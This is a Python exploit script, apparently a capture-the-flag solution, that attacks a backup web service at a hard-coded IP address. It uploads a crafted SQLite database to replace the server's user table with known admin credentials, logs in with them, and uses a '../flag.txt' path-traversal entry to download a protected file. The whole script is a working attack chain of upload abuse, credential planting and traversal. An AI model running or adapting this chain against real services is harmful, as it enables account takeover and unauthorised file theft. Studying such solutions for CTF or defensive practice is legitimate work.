import sqlite3
import base64
import requests


print("started")
# Step 1: Create crafted database
conn = sqlite3.connect('crafted_users.db')
c = conn.cursor()
c.execute('''CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agentid TEXT NOT NULL UNIQUE,
    passkey TEXT NOT NULL
)''')
c.execute("INSERT INTO users (agentid, passkey) VALUES ('admin', 'mypassword')")
c.execute('''CREATE TABLE backups (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    filename TEXT NOT NULL,
    file_size INTEGER NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
)''')
c.execute("INSERT INTO backups (user_id, filename, file_size) VALUES (1, '../flag.txt', 100)")
conn.commit()
conn.close()

# Step 2: Encode database
with open('crafted_users.db', 'rb') as f:
    base64_content = base64.b64encode(f.read()).decode('utf-8')
print('encoding')

#Step 3: Upload database
upload_url = 'http://94.237.58.172:57135/api/v1/upload'
payload = {"filename": "users.db", "content": base64_content}
response = requests.post(upload_url, json=payload)
if response.status_code != 200:
    print("Upload failed:", response.text)
    exit()


#Step 4: Log in
login_url = 'http://94.237.58.172:57135/api/v2/login'
session = requests.Session()
login_payload = {"agentid": "admin", "passkey": "mypassword"}
response = session.post(login_url, json=login_payload)
if response.status_code != 200:
    print("Login failed:", response.text)
    exit()

get_url = 'http://94.237.58.172:57135/api/v2/backups'
response = session.get(get_url)

print(response.text)
# Step 5: Download backups
for i, filename in enumerate(['/flag.txt'], 1):
    download_url = f'http://94.237.58.172:57135/api/v2/download/1'
    # payload = {'id':1}
    response = session.get(download_url)
    print(response)
    if response.status_code == 200:
        with open(filename, 'wb') as f:
            f.write(response.content)
        print(f"Downloaded {filename}")
    else:
        print(f"Failed to download backup {i}")
